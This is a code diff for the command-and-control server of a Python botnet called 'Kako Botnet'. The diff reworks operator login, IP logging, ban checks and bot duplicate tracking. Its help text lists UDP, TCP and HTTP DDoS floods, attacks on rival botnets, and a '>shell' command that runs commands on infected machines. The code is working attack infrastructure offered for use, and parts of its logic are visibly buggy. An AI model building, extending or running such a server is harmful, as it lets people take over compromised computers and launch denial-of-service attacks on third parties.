@@ -1,6 +1,5 @@
 # To create an account make a file called "login.txt" and follow instructions below.
 # Login Format: Username:Password:ID, (Admin: 1 | Others: 0)
-# Login is broken I think... and some other things. Dont Use
 import sys
 import time
 import socket
@@ -42,7 +41,9 @@ def botDisconnect():
 	
 def clientThread(conn):
 	try:
-		ip = load(urlopen('http://jsonip.com'))['ip']
+		global clients
+
+		ip = conn.getpeername()
 		createBanned = file("banned.txt", "a")
 		banned = file("banned.txt")
 		with open("banned.txt", "r") as banned:
@@ -51,8 +52,7 @@ def clientThread(conn):
 		for bannedLine in bannedLines:
 			if ip in bannedLine:
 				conn.send("[!] Your IP Address has been banned.\r\n")
-				clientDisconnect()
-				sys.exit()
+				conn.close()
 			else:
 				pass
 
@@ -71,21 +71,20 @@ def clientThread(conn):
 		with open("login.txt", "r") as login:
 			lines = login.readlines()
 
-		username = username(conn)
-		try:
-			password = password(conn)
-		except:
-			conn.close()
-			
 		while True:
+			username = username(conn)
+			password = password(conn)
+			#conn.send("%s\r\n" % username)
+			#conn.send("%s\r\n" % password)
 			for line in lines:
-				if line.split(":")[0].startswith(username) and line.split(":")[1].startswith(password):
+				if line.split(":")[0] == username and line.split(":")[1] == password:
 					conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
 					conn.sendall("[?] Please use the custom client.py made by Feitan\r\n")
 					conn.sendall("[?] Type >help for a list of commands\r\n")
 					conn.sendall("[?] Your username is: %s\r\n" % username)
 					bc.append(conn)
 					try:
+						clients = clients + 1
 						if line.split(":")[2].startswith("1"):
 							adminIP.append("%s | %s" % (username, ip))
 							admin.append(username)
@@ -96,14 +95,20 @@ def clientThread(conn):
 						break
 					while True:
 						try:
-							message = conn.recv(512)
+							def message(conn, prefix="CMD: "):
+								conn.send(prefix)
+								data = conn.recv(512)
+								if data:
+									return conn.recv(512)
+
+							message = message(conn) # If you press enter without anything in it, it wont do anything until you press it a second time...
 
 							if message:
 								if line.split(":")[2].startswith("1"):
-									nick = "* [%s] " % (username)
+									nick = "\r\n* [%s] " % (username)
 								else:
-									nick = "[%s] " % (username)
-								reply = "%s\r" % (message)
+									nick = "\r\n[%s] " % (username)
+								reply = "%s\r\nCMD: " % (message)
 								broadcast(nick, conn)
 								broadcast(reply, conn)
 							else:
@@ -126,11 +131,10 @@ def clientThread(conn):
 								conn.sendall("\r\n")
 								conn.sendall("[>] Bot Commands [<]\r\n")
 								conn.sendall("[!] Warning! These commands are built into the client made by Feitan not the server\r\n")
-								conn.sendall("[?] >udp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol UDP\r\n")
-								conn.sendall("[?] >tcp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
-								conn.sendall("[?] >http [Target(without http://)] [Threads] [Time(S)] - HTTP DDoS Attack\r\n")
+								conn.sendall("[?] >udp [Target] [Packet Size, (MAX: 65535)] [Time(S)] - DDoS Attack with the protocol UDP\r\n")
+								conn.sendall("[?] >tcp [Target] [Packet Size, (MAX: 65535)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
+								conn.sendall("[?] >http [Target, (without http://)] [Threads] [Time(S)] - HTTP DDoS Attack\r\n")
 								conn.sendall("[?] >cnc [Target] [Port] [Amount of Connections] - This is an attack on other CNC Botnets\r\n")
-								conn.sendall("[?] >killbots - Disconnects all bots\r\n")
 								conn.sendall("[?] >shell [Command] - Allows the host to use commands from the bots terminal\r\n")
 								conn.sendall("[?] >killattk - Stops all on going DDoS attacks\r\n")
 								if line.split(":")[2].startswith("1"):
@@ -201,8 +205,10 @@ def clientThread(conn):
 										pass
 									bc.append(conn)
 						except:
+							conn.close()
 							break
 						if not message:
+							clientDisconnect()
 							try:
 								adminIP.remove("%s | %s" % (username, ip))
 								admin.remove(username)
@@ -217,19 +223,17 @@ def clientThread(conn):
 							break
 			else:
 				try:
-					ip = load(urlopen('http://jsonip.com'))['ip']
+					ip = conn.getpeername()
+					#ip = load(urlopen('http://jsonip.com'))['ip']
 					fail = file("fails.txt", "a")
 					fail.write("%s:%s:%s\r\n" % (ip, username, password))
 					conn.send("[!] Incorrect Information!\r\n")
 					conn.send("[!] Your IP Address has been logged.\r\n")
-					clientDisconnect()
 					time.sleep(3)
 					conn.close()
 				except:
-					clientDisconnect()
 					conn.close()
 	except:
-		clientDisconnect()
 		pass
 
 def startClient():
@@ -244,19 +248,22 @@ def startClient():
 		global clients
 		time.sleep(1)
 		conn, addr = sock.accept()
-		clients = clients + 1
 
 		start_new_thread(clientThread, (conn,))
 	sock.close()
 
 def bot_thread(conn):
-	ip = load(urlopen('http://jsonip.com'))['ip']
+	try:
+		global ip
+		ip = conn.recv(512)
+	except:
+		pass
 	if ip in ips:
 		print("[*] DUP Detected. Removing DUP.")
-		conn.send(">killbots")
+		conn.send(">dup")
 		conn.close()
 
-	#ips.append(ip)
+	ips.append(ip)
 	while True:
 		try:
 			data = conn.recv(512)
@@ -265,9 +272,10 @@ def bot_thread(conn):
 			break
 		if not data:
 			pass
-	#ips.remove(ip)
+	ips.remove(ip)
 	botDisconnect()
 	conn.close()
+	sys.exit()
 
 def startBot():
 	host = connect
